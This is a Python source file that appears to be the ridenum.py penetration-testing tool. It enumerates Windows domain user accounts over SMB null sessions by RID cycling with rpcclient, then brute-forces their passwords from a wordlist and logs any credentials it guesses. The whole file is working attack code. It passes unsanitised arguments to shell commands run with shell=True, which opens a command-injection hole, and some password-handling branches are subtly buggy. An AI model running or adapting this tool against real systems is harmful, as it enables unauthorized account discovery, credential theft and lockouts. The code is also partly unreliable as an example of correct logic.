import os
import subprocess
import sys
try:
    import pexpect
except ImportError:
    print("[!] Sorry boss, python-pexpect is not installed. You need to install this first.")
    sys.exit()
def usage():
    print(r"""
.______       __   _______         _______ .__   __.  __    __  .___  ___.
|   _  \     |  | |       \       |   ____||  \ |  | |  |  |  | |   \/   |
|  |_)  |    |  | |  .--.  |      |  |__   |   \|  | |  |  |  | |  \  /  |
|      /     |  | |  |  |  |      |   __|  |  . `  | |  |  |  | |  |\/|  |
|  |\  \----.|  | |  '--'  |      |  |____ |  |\   | |  `--'  | |  |  |  |
| _| `._____||__| |_______/  _____|_______||__| \__|  \______/  |__|  |__|
                            |______|
Written by: David Kennedy (ReL1K)
Company: https://www.trustedsec.com
Twitter: @TrustedSec
Twitter: @HackingDave
Rid Enum is a RID cycling attack that attempts to enumerate user accounts through
null sessions and the SID to RID enum. If you specify a password file, it will
automatically attempt to brute force the user accounts when its finished enumerating.
- RID_ENUM is open source and uses all standard python libraries minus python-pexpect. -
You can also specify an already dumped username file, it needs to be in the DOMAINNAME\\USERNAME
format.
Example: ./ridenum.py 192.168.1.50 500 50000 /root/dict.txt
Usage: ./ridenum.py <server_ip> <start_rid> <end_rid> <optional_password_file> <optional_username_filename>
""")
    sys.exit()
denied = 0
def check_user_lsa(ip):
    proc = subprocess.Popen('rpcclient -U "" {0} -N -c "lsaquery"'.format(ip), stdout=subprocess.PIPE, shell=True)
    stdout_value = proc.communicate()[0]
    if not "Domain Sid" in stdout_value:
        return False
    else:
        return stdout_value
def check_user(ip, account):
    proc = subprocess.Popen('rpcclient -U "" {0} -N -c "lookupnames {1}"'.format(ip, account),
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=True)
    stdout_value = proc.communicate()[0]
    bad_statuses = ["NT_STATUS_NONE_MAPPED", "NT_STATUS_CONNECTION_REFUSED", "NT_STATUS_ACCESS_DENIED"]
    if any(x in stdout_value for x in bad_statuses):
        return False
    else:
        return stdout_value
def chunk(l, n):
    for i in range(0, len(l), n):
        yield l[i:i + n]
def sids_to_names(ip, sid, start, stop):
    rid_accounts = []
    ranges = ['{0}-{1}'.format(sid, rid) for rid in range(start, stop)]
    chunk_size = 2500
    if sys.platform == 'darwin':
        chunk_size = 5000
    chunks = list(chunk(ranges, chunk_size))
    for c in chunks:
        command = 'rpcclient -U "" {0} -N -c "lookupsids '.format(ip)
        command += ' '.join(c)
        command += '"'
        proc = subprocess.Popen(command, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, shell=True)
        stdout_value = proc.communicate()[0]
        if "NT_STATUS_ACCESS_DENIED" in stdout_value:
            print("[!] Server sent NT_STATUS_ACCESS DENIED, unable to extract users.")
            global denied
            denied = 1
            break
        for line in stdout_value.rstrip().split('\n'):
            if "*unknown*" not in line:
                if line != "":
                    rid_account = line.split(" ", 1)[1]
                    if rid_account != "request" and '00000' not in rid_account and '(1)' in rid_account:
                        rid_account = rid_account.replace("(1)", "")
                        rid_account = rid_account.rstrip()
                        rid_accounts.append(rid_account)
    return rid_accounts
success = False
sid = None
try:
    if len(sys.argv) < 4:
        usage()
    ip = sys.argv[1]
    rid_start = sys.argv[2]
    rid_stop = sys.argv[3]
    passwords = ""
    userlist = ""
    if len(sys.argv) > 4:
        passwords = sys.argv[4]
        if not os.path.isfile(passwords):
            print("[!] File was not found. Please try a path again.")
            sys.exit()
    if len(sys.argv) > 5:
        userlist = sys.argv[5]
        if not os.path.isfile(userlist):
            print("[!] File was not found. Please try a path again.")
            sys.exit()
    if not userlist:
        print("[*] Attempting lsaquery first...This will enumerate the base domain SID")
        sid = check_user_lsa(ip)
        if sid:
            sid = sid.replace("WARNING: Ignoring invalid value 'share' for parameter 'security'", "")
            print("[*] Successfully enumerated base domain SID. Printing information: \n" + sid.rstrip())
            print("[*] Moving on to extract via RID cycling attack.. ")  # format it properly
            sid = sid.rstrip()
            sid = sid.split(" ")
            sid = sid[4]
    else:
        print("[!] Unable to enumerate through lsaquery, trying default account names..")
        accounts = ("administrator", "guest", "krbtgt", "root")
        for account in accounts:
            sid = check_user(ip, account)
            if not sid:
                print("[!] Failed using account name: {0}...Attempting another.".format(account))
            else:
                print("[*] Successfully enumerated SID account.. Moving on to extract via RID.\n")
                break
        if sid:
            sid = sid.split(" ")
            sid = sid[1]
            sid = sid[:-4]
        else:
            denied = 1
            print("[!] Failed to enumerate SIDs, pushing on to another method.")
    print("[*] Enumerating user accounts.. This could take a little while.")
    rid_start = int(rid_start)
    rid_stop = int(rid_stop)
    if os.path.isfile("{0}_users.txt".format(ip)):
        os.remove("{0}_users.txt".format(ip))
    with open("{0}_users.txt".format(ip), "a") as filewrite:
        sid_names = sids_to_names(ip, sid, rid_start, rid_stop)
        if sid_names:
            for name in sid_names:
                print("Account name: {0}".format(name))
                filewrite.write(name + "\n")
    if denied == 0:
        print("[*] RID_ENUM has finished enumerating user accounts...")
    if denied == 1:
        print("[*] Attempting enumdomusers to enumerate users...")
        proc = subprocess.Popen("rpcclient -U '' -N {0} -c 'enumdomusers'".format(ip), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        with open("{0}_users.txt".format(ip), "a") as filewrite:
            counter = 0
            for line in iter(proc.stdout.readline, ''):
                counter = 1
                if line != '':
                    if "user:" in line:
                        line = line.split("rid:")
                        line = line[0].replace("user:[", "").replace("]", "")
                        print(line)
                        filewrite.write(line + "\n")
                    else:
                        denied = 2
                        break
                else:
                    if counter == 0:
                        break
        if counter == 0:
            denied = 2
        if denied == 2:
            print("[!] Sorry. RID_ENUM failed to successfully enumerate users. Bummers.")
        if denied == 1:
            print("[*] Finished dumping users, saved to {0}_users.txt.".format(ip))
    if passwords:
        with open(passwords) as fileopen:
            passfile = fileopen.readlines()
        if not userlist:
            userlist = "{0}_users.txt".format(ip)
        with open(userlist) as fileopen:
            userfile = fileopen.readlines()
        for user in userfile:
            with open("{0}_success_results.txt".format(ip), "a") as filewrite:
                user = user.rstrip()
                user_fixed = user.replace("\\", "\\\\").replace("'", "")
                if user:
                    for password in passfile:
                        password = password.rstrip()
                        if password == "lc username":
                            try:
                                if "\\" in password:
                                    password = user.split("\\")[1]
                                    password = password.lower()
                                else:
                                    password = user.lower()
                            except:
                                pass
                        if password == "uc username":
                            try:
                                if "\\" in password:
                                    password = user.split("\\")[1]
                                    password = password.upper()
                                else:
                                    password = user.lower()
                            except:
                                pass
                        if password != "":
                            child = pexpect.spawn("rpcclient -U '{0}%{1}' {2}".format(user_fixed, password, ip))
                        if password == "":
                            child = pexpect.spawn("rpcclient -U '{0}' -N {1}".format(user_fixed, ip))
                        i = child.expect(['LOGON_FAILURE', 'rpcclient', 'NT_STATUS_ACCOUNT_EXPIRED',
                                          'NT_STATUS_ACCOUNT_LOCKED_OUT', 'NT_STATUS_PASSWORD_MUST_CHANGE',
                                          'NT_STATUS_ACCOUNT_DISABLED', 'NT_STATUS_LOGON_TYPE_NOT_GRANTED',
                                          'NT_STATUS_BAD_NETWORK_NAME', 'NT_STATUS_CONNECTION_REFUSED',
                                          'NT_STATUS_PASSWORD_EXPIRED', 'NT_STATUS_NETWORK_UNREACHABLE'])
                        if i == 0:
                            if "\\" in password:
                                password = password.split("\\")[1]
                            print("Failed guessing username of {0} and password of {1}".format(user, password))
                            child.kill(0)
                        if i == 1:
                            print("[*] Successfully guessed username: {0} with password of: {1}".format(user, password))
                            filewrite.write("username: {0} password: {1}\n".format(user, password))
                            success = True
                            child.kill(0)
                        if i == 2:
                            print("[-] Successfully guessed username: {0} with password of: {1} however, it is set to expired.".format(user, password))
                            filewrite.write("username: {0} password: {1}\n".format(user, password))
                            success = True
                            child.kill(0)
                        if i == 3:
                            print("[!] Careful. Received a NT_STATUS_ACCOUNT_LOCKED_OUT was detected.. \
                                                          You may be locking accounts out!")
                            child.kill(0)
                        if i == 4:
                            print("[*] Successfully guessed password but needs changed. Username: {0} with password of: {1}".format(user, password))
                            filewrite.write("CHANGE PASSWORD NEEDED - username: {0} password: {1}\n".format(user, password))
                            success = True
                            child.kill(0)
                        if i == 5:
                            print("[*] Account is disabled: {0} with password of: {1}".format(user, password))
                            filewrite.write("ACCOUNT DISABLED: {0} PW: {1}\n".format(user, password))
                            success = True
                            child.kill(0)
                        if i == 8 or i == 9:
                            print("[!] Unable to connect to the server. Try again or check networking settings.")
                            print("[!] Exiting RIDENUM...")
                            success = False
                            sys.exit()
                        if i == 9:
                            print("[*] Successfully guessed username: {0} with password of (NOTE IT IS EXPIRED!): {1}".format(user, password))
                            filewrite.write("username: {0} password: {1} (password expired)\n".format(user, password))
                            success = True
                            child.kill(0)
        if success:
            print("[*] We got some accounts, exported results to {0}_success_results_txt".format(ip))
            print("[*] All accounts extracted via RID cycling have been exported to {0}_users.txt".format(ip))
        else:
            print("\n[!] Unable to brute force a user account, sorry boss.")
        sys.exit()  # except keyboard interrupt
except KeyboardInterrupt:
    print("[*] Okay, Okay... Exiting... Thanks for using ridenum.py")